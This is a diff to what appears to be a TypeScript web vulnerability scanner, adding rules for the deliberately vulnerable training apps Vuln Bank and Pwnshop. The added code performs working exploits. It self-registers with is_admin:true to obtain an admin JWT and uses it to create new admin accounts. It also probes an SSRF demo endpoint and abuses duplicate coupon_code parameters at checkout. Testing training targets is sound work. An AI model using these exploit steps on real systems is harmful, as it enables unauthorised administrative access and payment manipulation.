@@ -23236,6 +23236,139 @@ const vulnbankSup3rSecretAdminRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+async function vulnbankBoplaAdminToken(ctx: RuleContext): Promise<string | null> {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return null;
+  const username = `thugir_adm_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const registerUrl = new URL("/register", ctx.origin).toString();
+  const registerDoc = await ctx.probe.get(registerUrl, {
+    method: "POST",
+    body: JSON.stringify({
+      username,
+      password: VULNBANK_PROBE_PASSWORD,
+      is_admin: true
+    }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (registerDoc.status < 200 || registerDoc.status >= 300) return null;
+  try {
+    const parsed = JSON.parse(registerDoc.body) as {
+      status?: string;
+      debug_data?: { is_admin?: boolean };
+    };
+    if (parsed.status !== "success" || parsed.debug_data?.is_admin !== true) return null;
+  } catch {
+    return null;
+  }
+  const loginUrl = new URL("/login", ctx.origin).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify({ username, password: VULNBANK_PROBE_PASSWORD }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (loginDoc.status < 200 || loginDoc.status >= 300) return null;
+  try {
+    const parsed = JSON.parse(loginDoc.body) as { status?: string; token?: string; isAdmin?: boolean };
+    const token = String(parsed.token ?? "");
+    if (parsed.status !== "success" || parsed.isAdmin !== true || !token.startsWith("eyJ")) return null;
+    return token;
+  } catch {
+    return null;
+  }
+}
+
+const vulnbankCreateAdminLiveOracle: Rule = async (ctx) => {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
+  const token = await vulnbankBoplaAdminToken(ctx);
+  if (!token) return NEGATIVE;
+  const createUrl = new URL("/admin/create_admin", ctx.origin).toString();
+  const newAdmin = `thugir_newadm_${Date.now().toString(36)}`;
+  const doc = await ctx.probe.get(createUrl, {
+    method: "POST",
+    body: JSON.stringify({ username: newAdmin, password: "ThugirAdmin1!" }),
+    headers: {
+      "Content-Type": "application/json",
+      Authorization: `Bearer ${token}`
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  let parsed: Record<string, unknown> | null = null;
+  try {
+    parsed = JSON.parse(doc.body) as Record<string, unknown>;
+  } catch {
+    return NEGATIVE;
+  }
+  if (String(parsed.status ?? "") !== "success") return NEGATIVE;
+  if (!/admin created successfully/i.test(String(parsed.message ?? ""))) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: createUrl,
+      newAdmin,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Vuln Bank POST /admin/create_admin accepts BOPLA-escalated admin JWT and creates a new admin account — privileged admin-creation oracle"
+    }
+  };
+};
+
+const vulnbankCreateAdminRouteLiveOracle: Rule = async (ctx) => {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/admin\/create_admin\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await vulnbankCreateAdminLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Vuln Bank /admin/create_admin route scan — BOPLA-escalated admin JWT creates new admin via POST — route-specific admin-creation oracle"
+    }
+  };
+};
+
+const vulnbankInternalConfigSsrfDemoLiveOracle: Rule = async (ctx) => {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
+  const url = new URL("/internal/config.json", ctx.origin).toString();
+  const doc = await ctx.probe.get(url, { maxBytes: 2048, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 500) return NEGATIVE;
+  if (!/Internal resource/i.test(doc.body) || !/Loopback only/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: doc.status === 403 ? 0.91 : 0.92,
+    evidence: {
+      url,
+      status: doc.status,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Vuln Bank GET /internal/config.json returns loopback-only SSRF demo metadata — in-band SSRF training oracle target"
+    }
+  };
+};
+
+const vulnbankInternalConfigRouteLiveOracle: Rule = async (ctx) => {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/internal\/config\.json\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await vulnbankInternalConfigSsrfDemoLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Vuln Bank /internal/config.json route scan — loopback-only SSRF demo metadata endpoint — route-specific in-band SSRF oracle target"
+    }
+  };
+};
+
 const vulnbankCheckBalanceIdorLiveOracle: Rule = async (ctx) => {
   if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
   const username = `thugir_bal_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
@@ -36091,6 +36224,96 @@ const pwnshopCouponCategoryBypassRouteLiveOracle: Rule = async (ctx) => {
       note: /\/cart\b/i.test(pageUrl)
         ? "Pwnshop /cart route scan — PHONE20 rejected at /apply-coupon for fashion cart but checkout accepts coupon_code=PHONE20 without category re-validation (PWN-016)"
         : "Pwnshop /apply-coupon route scan — PHONE20 rejected at /apply-coupon for fashion cart but checkout accepts coupon_code=PHONE20 without category re-validation (PWN-016)"
+    }
+  };
+};
+
+function pwnshopCheckoutTotalsFromBody(
+  body: string
+): { subtotal: number; grandTotal: number } | null {
+  const subMatch = body.match(/Subtotal<\/span><span[^>]*>₦([\d,]+\.?\d*)/i);
+  const totalMatch = body.match(/totalDisplay">₦([\d,]+\.?\d*)/i);
+  if (!subMatch || !totalMatch) return null;
+  const parseNaira = (value: string) => parseFloat(value.replace(/,/g, ""));
+  const subtotal = parseNaira(subMatch[1]);
+  const grandTotal = parseNaira(totalMatch[1]);
+  if (!Number.isFinite(subtotal) || !Number.isFinite(grandTotal)) return null;
+  return { subtotal, grandTotal };
+}
+
+const pwnshopCheckoutHppCouponLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const cookie = await pwnshopCompleteOtpSession(ctx);
+  if (!cookie) return NEGATIVE;
+  const addCartUrl = new URL("/cart/add", ctx.origin).toString();
+  await ctx.probe.get(addCartUrl, {
+    method: "POST",
+    body: "product_id=4&quantity=1",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: cookie
+    },
+    maxBytes: 2048,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  await pwnshopSleep(400);
+  const checkoutUrl = new URL("/checkout", ctx.origin).toString();
+  const checkoutHeaders = {
+    "Content-Type": "application/x-www-form-urlencoded",
+    Cookie: cookie
+  };
+  const checkoutBase =
+    "shipping_address=Thugir+probe+address&payment_method=wallet&_delivery_type=pickup&delivery_zone=others";
+  const discountedDoc = await ctx.probe.get(checkoutUrl, {
+    method: "POST",
+    body: `${checkoutBase}&coupon_code=HALFOFF`,
+    headers: checkoutHeaders,
+    maxBytes: 65536,
+    timeoutMs: 15000
+  });
+  const hppDoc = await ctx.probe.get(checkoutUrl, {
+    method: "POST",
+    body: `${checkoutBase}&coupon_code=HALFOFF&coupon_code=INVALID`,
+    headers: checkoutHeaders,
+    maxBytes: 65536,
+    timeoutMs: 15000
+  });
+  if (discountedDoc.status < 200 || discountedDoc.status >= 400) return NEGATIVE;
+  if (hppDoc.status < 200 || hppDoc.status >= 400) return NEGATIVE;
+  const discountedTotals = pwnshopCheckoutTotalsFromBody(discountedDoc.body);
+  const hppTotals = pwnshopCheckoutTotalsFromBody(hppDoc.body);
+  if (!discountedTotals || !hppTotals) return NEGATIVE;
+  if (discountedTotals.subtotal >= hppTotals.subtotal) return NEGATIVE;
+  if (hppTotals.grandTotal <= discountedTotals.grandTotal) return NEGATIVE;
+  if (Math.abs(hppTotals.subtotal - 19000) > 250) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      checkoutUrl,
+      discountedSubtotal: discountedTotals.subtotal,
+      discountedGrandTotal: discountedTotals.grandTotal,
+      hppSubtotal: hppTotals.subtotal,
+      hppGrandTotal: hppTotals.grandTotal,
+      note: "Pwnshop POST /checkout with coupon_code=HALFOFF&coupon_code=INVALID silently discards the 50% HALFOFF discount (express array coercion) — HTTP parameter pollution coupon bypass (PWN-039)"
+    }
+  };
+};
+
+const pwnshopCheckoutHppCouponRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/cart\b|\/checkout\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await pwnshopCheckoutHppCouponLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Pwnshop /cart route scan — duplicate coupon_code at checkout silently drops HALFOFF discount via express array coercion — route-specific HPP coupon bypass oracle (PWN-039)"
     }
   };
 };
@@ -86022,6 +86245,10 @@ export const RULES: Record<string, Rule> = {
   vulnbankV3ResetPasswordVersioningRouteLiveOracle,
   vulnbankSup3rSecretAdminLiveOracle,
   vulnbankSup3rSecretAdminRouteLiveOracle,
+  vulnbankCreateAdminLiveOracle,
+  vulnbankCreateAdminRouteLiveOracle,
+  vulnbankInternalConfigSsrfDemoLiveOracle,
+  vulnbankInternalConfigRouteLiveOracle,
   vulnbankRequestLoanLiveOracle,
   vulnbankRequestLoanNegativeAmountLiveOracle,
   vulnbankRequestLoanRouteLiveOracle,
@@ -86217,6 +86444,8 @@ export const RULES: Record<string, Rule> = {
   pwnshopCartCheckoutRouteLiveOracle,
   pwnshopApplyCouponRouteLiveOracle,
   pwnshopCouponCategoryBypassRouteLiveOracle,
+  pwnshopCheckoutHppCouponLiveOracle,
+  pwnshopCheckoutHppCouponRouteLiveOracle,
   pwnshopSellerPreviewSstiLiveOracle,
   pwnshopDownloadPathTraversalLiveOracle,
   pwnshopSellerPreviewSstiRouteLiveOracle,
